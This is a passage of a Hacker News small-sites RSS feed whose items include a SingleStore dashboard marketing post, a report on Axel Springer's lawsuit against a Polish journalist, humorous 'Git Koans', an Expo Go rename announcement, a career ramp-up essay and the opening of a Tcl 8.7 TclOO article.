            <pubDate>Wed, 23 Dec 2020 05:57:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SingleStore for Fastboards]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514758">thread link</a>) | @Caitin_Chen
<br/>
December 22, 2020 | https://www.singlestore.com/blog/singlestore-for-fastboards/ | <a href="https://web.archive.org/web/*/https://www.singlestore.com/blog/singlestore-for-fastboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    <div>
                <h2><b>Introduction</b></h2>
<p><span>Over the last many years, analytical dashboards have proliferated enterprises from the boardroom to the manufacturing line. As businesses have become increasingly more reliant on analytics, end users have started to demand snappier performance from their dashboards. Gone are the days that visualizations are used simply for historical data. Data professionals are now using them for predictive and prescriptive analytics on petabytes of information, expecting the most real-time insights to tell their data stories.</span></p>
<p><span>Many organizations across consumer products, healthcare, fintech and other verticals have been met with the challenge of slow moving BI applications in recent years, due to the growth of data and many new types of users. Backend platforms are often retooled for each use case and still are unable to handle the growing concurrency demands of the business. This leads to applications that take too long to render and users that are faced with the dreaded “loading” pinwheel.</span></p>
<h2><b>The Pain</b></h2>
<p><span>The challenge of slow-running dashboards is not limited to legacy systems. Users experience slow dashboards when their applications are backed by legacy architectures as well as by more modern database systems.&nbsp;</span><span>The pain points that enterprises face with legacy architectures start with the original intent of those systems: to support historical reporting and batch-oriented dashboards. Many databases from vendors like Oracle were built around a different era of business demands — when operational decisions were not made through data visualization. Over time, other (now legacy) systems like SQL Server emerged to help with transactional processing of data. This spread of new database systems purpose-built by workload introduced put even more stress on ETL technologies. The Hadoop era aimed to solve this, but ultimately consumers were left at the mercy of too many different systems for data to reside in and excessive data duplication across those silos. This made data storytelling very difficult.</span><span>&nbsp;</span></p>
<p><img loading="lazy" src="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards.png" alt="" width="1600" height="954" srcset="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards.png 1600w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards-300x179.png 300w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards-1024x611.png 1024w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards-768x458.png 768w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards-1536x916.png 1536w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_1_fastboards-1070x638.png 1070w" sizes="(max-width: 1600px) 100vw, 1600px"></p>
<p><span>The Challenge of Legacy Architectures</span></p>
<p><span>The struggle with legacy data systems has been even further exposed with the emergence of streaming data. Data is now being unlocked from chatty systems like e-commerce systems, financial trades, and oil and gas machinery. Real-time data pipelines from messaging infrastructures like Kafka, Kinesis, Pulsar and others have put an even greater burden on old, slow databases. Users expect the data from these applications to be readily available in real-time and operational dashboards, often combined with historical reference data. Instead, they end up stuck with dashboards struggling to load data for critical business decisioning.&nbsp;</span></p>
<p><img loading="lazy" src="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2.png" alt="" width="2880" height="1220" srcset="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2.png 2880w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-300x127.png 300w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-1024x434.png 1024w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-768x325.png 768w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-1536x651.png 1536w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-2048x868.png 2048w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_2-1070x453.png 1070w" sizes="(max-width: 2880px) 100vw, 2880px"></p>
<p><span>Introducing Streaming Data</span></p>
<p><span>The challenges that legacy data platforms faced in the face of the growing base of analytics users has been met with the advent of modern data platforms. These platforms tout a new focus toward analytics, AI and machine learning. While modern data platforms still tend to specialize in OLTP or OLAP workloads, data platform vendors are adding even further delineation on the lines of data type — MongoDB specializes in document data, Redis for key-value data, etc. This approach works very well for application data that can often be unstructured and transactional. However, tying together multiple single-purpose databases for a unified visual experience remains extremely slow, and thus data stories end up very disjointed.&nbsp;</span></p>
<p><span>Cloud data warehouses have started to solve this problem, but scaling to satisfy an enterprise-scale analytics audience and handling operational data with platforms like Snowflake has proven to be extremely costly. This concern is primarily rooted in unpredictable compute costs as more and more users start accessing these dashboards. As more users come onto the platform, response times also become far less consistent. Ultimately, consumers end up losing the low latency response they were promised and organizations still end up spending more than expected.</span></p>
<p><span>Finally, organizations also try to solve their dashboard needs with a data federation approach. Federation vendors often tout the ability to have a single point of data access to all data sources. Unfortunately, this typically gets customers in more trouble due to 1) the high costs of procuring this technology and hosting it on very large servers, 2) a single point of failure, and 3) a newly introduced bottleneck which slows down dashboards even more.&nbsp;</span></p>
<p><img loading="lazy" width="1600" height="954" src="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data.png" alt="" srcset="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data.png 1600w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data-300x179.png 300w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data-1024x611.png 1024w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data-768x458.png 768w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data-1536x916.png 1536w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_3_introducing-modern-data-1070x638.png 1070w" sizes="(max-width: 1600px) 100vw, 1600px"></p>
<p><span>Introducing Modern Data Platforms, and their challenges</span></p>
<p><span>The pains faced by dashboard users and the engineers behind them can very often be linked back to the monolithic legacy systems that they are architected upon, or often the overindulgence in new, single-purpose data platform technology. Accelerating those dashboards, and tuning your systems to be ready for</span> <span>fastboards requires a scalable, general purpose database built for fast data ingestion and limitless amounts of users. SingleStore Managed Service is built for fastboards.&nbsp;</span></p>
<h2><b>SingleStore Managed Service</b></h2>
<p><a href="https://www.memsql.com/"><span>SingleStore</span></a><span>’s database-as-a-service offering is called <em>SingleStore Managed Service.</em></span>&nbsp;<span>Our platform is a distributed, highly-scalable, cloud-native SQL database built for fastboards. SingleStore is designed for highly performant ingest of any operational data, whether it is batch or streaming in nature. We make ingesting your data incredibly easy through SingleStore Pipelines, your way to get data from anywhere with five lines of SQL. Data can be brought from many different source systems like S3, Kafka, Azure Blob, etc. and streamed in parallel to make your data instantaneously queryable upon ingest.</span></p>
<p><span>SingleStore offers a singular table type for all of your data storytelling needs. SingleStore’s architecture allows you to support large-scale Online Transaction Processing (OLTP) and Hybrid Transactional and Analytical Processing (HTAP) at a lower total cost of ownership. It is a continuing evolution of the </span><a href="https://docs.memsql.com/v7.1/concepts/columnstore/"><span>columnstore</span></a><span>, supporting transactional workloads that would have traditionally used the </span><a href="https://docs.memsql.com/v7.1/concepts/rowstore/"><span>rowstore</span></a><span>. With the ability to seek millions of rows at a time, scan billions, and compress your data 10X — SingleStore is the ultimate solution for fastboards. Most importantly, SingleStore Managed Service is a converged data platform that can store data of any type, JSON, time-series, key-value, etc — all with SQL.&nbsp;</span></p>
<p><span>Here at SingleStore, we believe many modern data platforms can coexist. Many of our customers leverage in-memory, NoSQL technologies for their mobile applications and relational, cloud EDWs for long-term storage of their data. However, when it comes to accelerating the most critical business insights driven by analytics, AI and machine learning, they turn to SingleStore.&nbsp;</span></p>
<p><span>Our Managed Service can help you </span><span>extend</span><span> your legacy platforms like Oracle and Teradata with fast ingest and querying, </span><i><span>complement </span></i><span>Snowflake and BigQuery without unpredictable costs, and </span><i><span>onboard</span></i><span> any new type of data without the constraints of NoSQL databases.&nbsp;</span></p>
<p><img loading="lazy" width="3200" height="1908" src="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4.png" alt="" srcset="https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4.png 3200w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-300x179.png 300w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-1024x611.png 1024w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-768x458.png 768w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-1536x916.png 1536w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-2048x1221.png 2048w, https://www.singlestore.com/blog/wp-content/uploads/2020/11/diagram_4-1070x638.png 1070w" sizes="(max-width: 3200px) 100vw, 3200px"></p>
<p><span>SingleStore Managed Service: The Data Platform for Fastboards</span></p>
<h2><b>What kinds of dashboards?</b></h2>
<p><span>As discussed, SingleStore is a fantastic choice for your most important visualization and analytics needs. The following section goes a bit deeper into exactly what types of dashboards SingleStore is powering today, and some of the important concepts.&nbsp;</span></p>
<p><span>SingleStore is the core data platform for many analytical applications:&nbsp;</span></p>
<ul>
<li><span>Real-Time Analytics&nbsp;</span></li>
<li><span>Operational BI</span></li>
<li><span>Historical Reporting</span></li>
<li><span>ML-Driven Analytics</span></li>
<li><span>Ad-Hoc Data Discovery, and many more</span></li>
</ul>
<p><span>Real-time dashboards are used to make critical business decisions in the moment. They often require sub-minute or sub-second latency, and are highly relevant in preventative maintenance, inventory and IoT applications. These types of workloads benefit greatly from SingleStore’s streaming ingestion, built-in predictive capabilities, and scalable analytics. SingleStore’s ability to quickly ingest high volumes of data, rapidly run predictive models for scoring, and store for fast retrieval makes it best in class for real-time dashboards. </span><a href="https://www.memsql.com/blog/case-study-medaxion-analytics-medtech/"><span>Medaxion</span></a><span> leverages SingleStore to achieve hospital event to insight within 30 seconds.</span></p>
<p><span>Historical Reporting dashboards encompass both the most recent data as well as long-term insights. They are often found supporting financial reporting and historical sales analytics use cases. SingleStore offers a number of different features that accelerate historical dashboards — drop-in SQL compatibility, scalable analytics functions, and built-in machine learning to name a few. SingleStore makes it extremely simple for dashboard developers to deliver high-quality, fast historical analytics for end consumers. </span><a href="https://www.memsql.com/blog/kellogg-case-study/"><span>Kellogg</span></a><span> uses the SingleStore platform to accelerate the speed of their Tableau dashboards by 80X.</span></p>
<p><span>Over time, we have seen machine learning and AI emerge to the forefront of analytics ecosystems and thus, visualizing ML through visualization has become a common way to share the performance of models. These dashboards are meant to provide a beautiful visual interface for otherwise complex data science workflows. They are often used to help executives and business people align with an organization’s predictive capabilities. At SingleStore, we see many of our customers leveraging our ML-enabled pipelines to score and visualize data in real-time. Users also leverage built-in predictive functions and our SingleStore capabilities to perform training and testing at large scale.&nbsp;</span></p>
<h2><b>Tools</b></h2>
<p><span>Having discussed many different variations of fastboard use cases, it is also important to address the vast landscape of tools and technologies that enable these. Furthermore, there is no feature more important for a database than seamless, performant connectivity to every dashboarding tool. SingleStore is wire protocol compatible with MySQL making it instantly accessible from any BI tool such as Tableau, PowerBI or Looker and with widely-available bindings to popular programming languages such as …</span></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.singlestore.com/blog/singlestore-for-fastboards/">https://www.singlestore.com/blog/singlestore-for-fastboards/</a></em></p>]]>
            </description>
            <link>https://www.singlestore.com/blog/singlestore-for-fastboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514758</guid>
            <pubDate>Wed, 23 Dec 2020 05:44:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Axel Springer SE sues Polish journalist who shed light on its Nazi past (2018)]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25514510">thread link</a>) | @AndrewBissell
<br/>
December 22, 2020 | https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire | <a href="https://web.archive.org/web/*/https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The first hearing in the court case of German-Swiss media empire Ringier Axel Springer against Polish journalist Witold Gadowski was set to take place in the regional court of Warsaw Provincial court of Warsaw but was postponed due to security concerns after up to 100 of Gadowski's supporters showed up in court. </p><div><p>Axel Springer SE is the largest digital publishing house in Europe, controlling two of Germany's largest news brands, Bild and Die Welt. In Poland, it's the publisher of country's largest tabloid "Fakt" and one of the largest weeklies "Newsweek" as well as the largest newsportal Onet.pl.</p>

<p>The media group sued Gadowski for his statement in which he claimed that the company, founded in 1946, was from the outset linked to people from the Wehrmacht, the SS and Gestapo, while the company’s founder, Axel Springer, was himself involved with the Nazi regime”. In response, the media group Gadowski for infringement of personal interests.</p>

<p>Axel Springer, born in 1912 worked as an editor in his father's newspaper "Altonaer Nachrichter". After Hitler came to power in 1933, the paper participated in the anti-Jewish progaganda campaign directed against the German Jewish community. He was also a member of the Nazi paramilitary organization "The National Socialist Motor Corps". Another stain on his legacy was his decision to abandon his half-Jewish wife Martha Else Meyer, who just had given birth to their first child, soon after the Nurnberg laws came into force and remarrying with an "Aryan" woman.</p>

<p>Witold Gadowski told the media present for the hearing that he hopes that justice will prevail and that the proceeding will be on the grounds of the Polish law, where the constitution guarantees the Polish journalists’ freedom of speech. He also underlined that Axel Ringer Springer is trying to infringe on that exact freedom of speech by taking him to court.</p>

<p>The judge was surprised by the number of people who appeared in the court to support Gadowski and postponed the hearing due to safety concerns.</p>

<p>According to Gadowski, the case filed against him by Axel Springer could first step on the road to restoring the faith in the media in Poland. The columnist said that he still has faith and believes that facts and the truth will be enough to win the case.</p>
</div></div>]]>
            </description>
            <link>https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514510</guid>
            <pubDate>Wed, 23 Dec 2020 04:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git Koans (2013)]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25514238">thread link</a>) | @mmettler
<br/>
December 22, 2020 | https://stevelosh.com/blog/2013/04/git-koans/ | <a href="https://web.archive.org/web/*/https://stevelosh.com/blog/2013/04/git-koans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-blog-entry"><article><p>Posted on April 8th, 2013.</p><p>Inspired by <a href="http://blog.sanctum.geek.nz/vim-koans/">Vim Koans</a>.</p>

<ol><li><a href="#s1-silence">Silence</a></li><li><a href="#s2-one-thing-well">One Thing Well</a></li><li><a href="#s3-only-the-gods">Only the Gods</a></li><li><a href="#s4-the-hobgoblin">The Hobgoblin</a></li><li><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></li></ol>

<h2 id="s1-silence"><a href="#s1-silence">Silence</a></h2>

<p>A Python programmer handed her <code>~/.gitconfig</code> to Master Git.  Among the many
lines were the following:</p>

<pre><code>[alias]
; Explicit is better than implicit.  If we want to merge
; we should do so ourselves.
pull = pull --ff-only</code></pre>

<p>Master Git nodded.  "<code>git pull origin master</code>," said the programmer.</p>

<p>Master Git pulled down the latest changes on <code>master</code> and automatically merged
them with the programmer's changes.</p>

<p>"But Master Git, did I not say to only fast-forward in my configuration?!" she
cried.</p>

<p>Master Git looked at her, nodded, and said nothing.</p>

<p>"Then why did you not warn me of a problem with my configuration?" she asked.</p>

<p>Master Git replied: "there was no problem."</p>

<p>Months later the programmer was reading <code>git --help config</code> for a different
reason and found enlightenment.</p>

<h2 id="s2-one-thing-well"><a href="#s2-one-thing-well">One Thing Well</a></h2>

<p>A UNIX programmer was working in the cubicle farms.  As she saw Master Git
traveling down the path, she ran to meet him.</p>

<p>"It is an honor to meet you, Master Git!" she said.  "I have been studying the
UNIX way of designing programs that each do one thing well.  Surely I can learn
much from you."</p>

<p>"Surely," replied Master Git.</p>

<p>"How should I change to a different branch?" asked the programmer.</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I create a branch?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I update the contents of a single file in my working directory,
without involving branches at all?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>After this third answer, the programmer was enlightened.</p>

<h2 id="s3-only-the-gods"><a href="#s3-only-the-gods">Only the Gods</a></h2>

<p>The great historian was trying to unravel the intricacies of an incorrect merge
that had happened many months ago.  He made a pilgrimage to Master Git to ask
for his help.</p>

<p>"Master Git," said the historian, "what is the nature of history?"</p>

<p>"History is immutable.  To rewrite it later is to tamper with the very fabric of
existence."</p>

<p>The historian nodded, then asked: "Is that why rebasing commits that have been
pushed is discouraged?"</p>

<p>"Indeed," said Master Git.</p>

<p>"Splendid!" exclaimed the historian.  "I have a historical record of a merge
commit with two parents.  How can I find out which branch each parent was
originally made on?"</p>

<p>"History is ephemeral," replied Master Git, "the knowledge you seek can be
answered only by the gods."</p>

<p>The historian hung his head as enlightenment crushed down upon him.</p>

<h2 id="s4-the-hobgoblin"><a href="#s4-the-hobgoblin">The Hobgoblin</a></h2>

<p>A novice was learning at the feet of Master Git.  At the end of the lesson he
looked through his notes and said, "Master, I have a few questions.  May I ask
them?"</p>

<p>Master Git nodded.</p>

<p>"How can I view a list of <em>all</em> tags?"</p>

<p>"<code>git tag</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> remotes?"</p>

<p>"<code>git remote -v</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> branches?"</p>

<p>"<code>git branch -a</code>", replied Master Git.</p>

<p>"And how can I view the current branch?"</p>

<p>"<code>git rev-parse --abbrev-ref HEAD</code>", replied Master Git.</p>

<p>"How can I delete a remote?"</p>

<p>"<code>git remote rm</code>", replied Master Git.</p>

<p>"And how can I delete a branch?"</p>

<p>"<code>git branch -d</code>", replied Master Git.</p>

<p>The novice thought for a few moments, then asked: "Surely some of these could be
made more consistent, so as to be easier to remember in the heat of coding?"</p>

<p>Master Git snapped his fingers.  A hobgoblin entered the room and ate the novice
alive.  In the afterlife, the novice was enlightened.</p>

<h2 id="s5-the-long-and-short-of-it"><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></h2>

<p>Master Git and a novice were walking along a bridge.</p>

<p>The novice, wanting to partake of Master Git's vast knowledge, said:
"<code>git branch --help</code>".</p>

<p>Master Git sat down and lectured her on the seven forms of <code>git branch</code>, and
their many options.</p>

<p>They resumed walking.  A few minutes later they encountered an experienced
developer traveling in the opposite direction.  He bowed to Master Git and said
"<code>git branch -h</code>".  Master Git tersely informed him of the most common <code>git
branch</code> options.  The developer thanked him and continued on his way.</p>

<p>"Master," said the novice, "what is the nature of long and short options for
commands?  I thought they were equivalent, but when that developer used <code>-h</code> you
said something different than when I said <code>--help</code>."</p>

<p>"Perspective is everything," answered the Master.</p>

<p>The novice was puzzled.  She decided to experiment and said "<code>git -h branch</code>".</p>

<p>Master Git turned and threw himself off the railing, falling to his death on the
rocks below.</p>

<p>Upon seeing this, the novice was enlightened.</p>
</article></div></div>]]>
            </description>
            <link>https://stevelosh.com/blog/2013/04/git-koans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514238</guid>
            <pubDate>Wed, 23 Dec 2020 03:59:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expo Go – a new name for the Expo Client]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514159">thread link</a>) | @joeyespo
<br/>
December 22, 2020 | https://blog.expo.io/expo-go-a-new-name-for-the-expo-client-4684a2709904 | <a href="https://web.archive.org/web/*/https://blog.expo.io/expo-go-a-new-name-for-the-expo-client-4684a2709904">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="9fa4">In 2021, the Expo Client app from the stores is getting a new name: <strong>Expo Go</strong></h2><div><div><div><p><a href="https://medium.com/@ji?source=post_page-----4684a2709904--------------------------------" rel="noopener"><img alt="James Ide" src="https://miro.medium.com/fit/c/96/96/1*Dr8BgQGDaFquTZkLUNh1DA.jpeg" width="48" height="48"></a></p></div></div></div><p id="285d">This coming January, the Expo Client app in the App Store and Google Play is getting a new name: <strong>Expo Go</strong>. The app will otherwise be the same.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/518/1*4FB9SXMPLhjxkTsiAV-ZKg.png" width="259" height="301" data-old-src="https://miro.medium.com/max/52/1*4FB9SXMPLhjxkTsiAV-ZKg.png?q=20"></p></div></div></figure><p id="9708">We’re renaming the app to make it clear when we’re talking about the development client in the app stores (Expo Go/Expo Client) in contrast with custom development clients that developers have built for their specific projects.</p><p id="cd3f">Expo Go/Expo Client provides a preset SDK with commonly used APIs like basic view components, images, camera access, notifications, device info, and more. The preset SDK meets the needs of many professional apps that use today’s managed workflow.</p><p id="ead5">However, apps whose needs aren’t met by the preset SDK want to have a custom set of modules or custom native code. Some developers might include existing modules like <code>expo-in-app-purchases</code> while others might write their own code for APIs that don’t yet have an Expo module. These projects with custom native modules or custom native code will each need their own custom development client instead of Expo Go/Expo Client.</p><p id="07e9">In this world with custom development clients, Expo Go/Expo Client isn’t the only or primary development client. To head off confusion between the Expo Client and other Expo development clients, we looked for a new name and chose “Expo Go”. Expo Go helps developers get going quickly, in many cases going all the way to production. The standard Expo workflow of the future might have both Expo Go and custom development clients:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3232/1*Yr3Idt7H52AQl25iqf2A5Q.png" width="1616" height="1283" srcset="https://miro.medium.com/max/552/1*Yr3Idt7H52AQl25iqf2A5Q.png 276w, https://miro.medium.com/max/1104/1*Yr3Idt7H52AQl25iqf2A5Q.png 552w, https://miro.medium.com/max/1280/1*Yr3Idt7H52AQl25iqf2A5Q.png 640w, https://miro.medium.com/max/1400/1*Yr3Idt7H52AQl25iqf2A5Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Yr3Idt7H52AQl25iqf2A5Q.png?q=20"></p></div></div></div><figcaption>Expo development clients span Expo Go, custom development clients, and web browsers, which are development clients for Expo web projects!</figcaption></figure><p id="fd39">Custom development clients are a long-term project in the concept design phase and involve a large amount of work and complexity across the Expo platform and Expo Application Services. One of the steps is to help clearly communicate how they fit into the Expo workflow and how they differ from the development clients in the app stores. So we’re renaming the Expo Client to Expo Go with the next app update coming soon to you.</p><p id="b895"><em>For developers extra excited about building custom development clients and production apps in the cloud, check out </em><a rel="noopener" href="https://blog.expo.io/expo-application-services-eas-build-and-submit-fc1d1476aa2e"><em>our announcement of Expo Application Services (EAS)</em></a><em>, the Expo team’s upcoming complementary suite of cloud services for both Expo and React Native developers.</em></p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.expo.io/expo-go-a-new-name-for-the-expo-client-4684a2709904</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514159</guid>
            <pubDate>Wed, 23 Dec 2020 03:46:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A career cold start algorithm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514098">thread link</a>) | @enigmatic02
<br/>
December 22, 2020 | https://boz.com/articles/career-cold-start | <a href="https://web.archive.org/web/*/https://boz.com/articles/career-cold-start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>Several times in my career, I’ve joined a team whose work was already well
under way, where I had a massive knowledge deficit, and didn’t have
pre-existing relationships. None of those excuses relieved me from the pressure
I felt to establish myself and contribute. Over time, I realized that the
natural instinct to push for early impact leads many incoming leaders into
challenging relationships as they expose their knowledge deficit and waste
time. So, I developed an algorithm that has helped me ramp up quickly — and
in several cases — have an impact in a relatively short period of time, while
minimizing collateral damage.</p>
<p>The first step is to find someone on the team and ask for 30 minutes with them.
In that meeting you have a simple agenda:</p>
<ul>
<li>For the first 25 minutes: ask them to tell you everything they think you
should know. Take copious notes. Only stop them to ask about things you don’t
understand. Always stop them to ask about things you don’t understand.</li>
<li>For the next 3 minutes: ask about the biggest challenges the team has right
now.</li>
<li>In the final 2 minutes: ask who else you should talk to. Write down every
name they give you.</li>
</ul>
<p>Repeat the above process for every name you’re given. Don’t stop until there
are no new names.</p>
<p>The sum of the answers from the first 25 mins will not give you a complete
picture of the team’s work. That will take months to develop. But they will
give you a framework for integrating new information more quickly, which will
speed up how fast you ramp. It will also heavily over index on the areas of
work under active discussion, which will help you dive in productively to the
most critical discussions immediately. The nature of what people choose to
discuss is a very valuable signal about the problems the team face, as it may
be about the work, the organization, or process. Finally, it will give you a
sense of the language and terminology that can very often be a barrier to
working smoothly with teams.</p>
<p>The answers from the second question give you a cheat sheet on how to impress
the team with early positive impact. Some of the things you’ll hear will take
time to fix, such as “we need a bigger team” or “our infrastructure isn’t
scaling.” Those are important and it will be good for the team to hear you
internalize those challenges. But a surprising number of the issues you’ll
hear repeatedly will be things you can easily help with, like “we waste a
bunch of time in meetings every week” or “we need a dedicated conference
room.” I start with the latter as quickly as I can because those are the
types of things teams often neglect to prioritize, in spite of a compounding
negative impact on progress.</p>
<p>The third question will give you a valuable map of influence in the
organization. The more often names show up and the context in which they show
up tends to provide a very different map of
the organization than the one in the <a href="http://boz.com/articles/damn-the-org-chart.html">org chart</a>.</p>
<p>For all the value I just described, the greatest value in this process isn’t
in the answers — it is in the asking. Taking these meetings and listening
shows proper respect for the team that’s in place. It can be hard to remember,
but while you may be insecure about taking a new role because you feel like
you’re at a disadvantage, the people you’re speaking with may also be unsure
about you taking that role and what it means for them. Demonstrating mutual
respect builds the trust required to make progress.</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/career-cold-start</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514098</guid>
            <pubDate>Wed, 23 Dec 2020 03:34:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Voting System Examination of Election Systems and Software EVS 6.1.1.0 [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514069">thread link</a>) | @js2
<br/>
December 22, 2020 | https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf | <a href="https://web.archive.org/web/*/https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514069</guid>
            <pubDate>Wed, 23 Dec 2020 03:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tcl 8.7 Part 8: TclOO]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514055">thread link</a>) | @blacksqr
<br/>
December 22, 2020 | https://www.magicsplat.com/blog/tcl87-oo/ | <a href="https://web.archive.org/web/*/https://www.magicsplat.com/blog/tcl87-oo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <header>
                        
                        <p>
                            Published <time datetime="2020-05-23+0000">2020-05-23</time>
                        </p>
                    </header>
                    <p>
                        This is the eighth in a series of <a href="https://www.magicsplat.com/blog/tags/tcl-8-7/">posts</a> about new features in the upcoming version 8.7 of Tcl. It describes several enhancements to Tcl's features for object-oriented programming.
                    </p><!-- more -->
                    <blockquote>
                        <p>
                            To take Tcl 8.7 for a spin, you can download the <a href="https://sourceforge.net/projects/tcl/files/Tcl/8.7a3/">source</a> distribution. Binary distributions for Windows are available from <a href="https://sourceforge.net/projects/magicsplat/files/barebones-tcl/">magicsplat</a> and <a href="http://www.bawt.tcl3d.org/download.html#tclbi">BAWT</a>.
                        </p>
                    </blockquote>
                    <p>
                        <strong>NOTE:</strong> If you are not familiar with the object-oriented programming features in Tcl 8.6, see this <a href="https://www.magicsplat.com/articles/oo.html">tutorial</a>.
                    </p>
                    <p>
                        These enhancements, courtesy <a href="https://wiki.tcl-lang.org/page/Tcl+Core+Team">TCT</a> member <a href="https://wiki.tcl-lang.org/page/Donal+Fellows">Donal Fellows</a>, include
                    </p>
                    <ul>
                        <li>Private variables and methods
                        </li>
                        <li>Inline <code>export</code> / <code>unexport</code> modifiers
                        </li>
                        <li>Additional slot operations
                        </li>
                        <li>Class variables and methods
                        </li>
                        <li>Singleton and abstract classes
                        </li>
                        <li>Convenience commands for common operations
                        </li>
                        <li>Hooks for extending the class and object definition language
                        </li>
                        <li>Utilities for creating custom definition dialects
                        </li>
                    </ul>
                    <p>
                        Some of the above do not introduce any new capabilities into Tcl. Rather they make some programming idioms more convenient and formalize some implementation dependent behaviors.
                    </p>
                    <p>
                        Describing all the above would make for a rather lengthy post so this post only covers the first three. The remaining will be the topic of a future post.
                    </p>
                    <h2>
                        Private variables and methods
                    </h2>
                    <p>
                        A limitation of TclOO in 8.6 was that methods were either exported (aka public), which made them callable from all contexts, or not exported which made them callable only from within the object's context. The latter includes <em>all</em> methods defined for that object including those in subclasses, mixins, filters etc. This broke isolation between class definitions.
                    </p>
                    <ul>
                        <li>
                            <p>
                                An author of a subclass had to be careful when defining a method (even unexported) not to give it the same name as a method in the superclass.
                            </p>
                        </li>
                        <li>
                            <p>
                                At the same time, if the superclass implementation changed, necessitating the addition of a new method for private use, there is the risk that it will be hidden by a method of the same name in a subclass. Since the two classes may be written by different authors or teams, and the superclass may not be even aware of the existence of the subclass that uses it, this is a real risk.
                            </p>
                        </li>
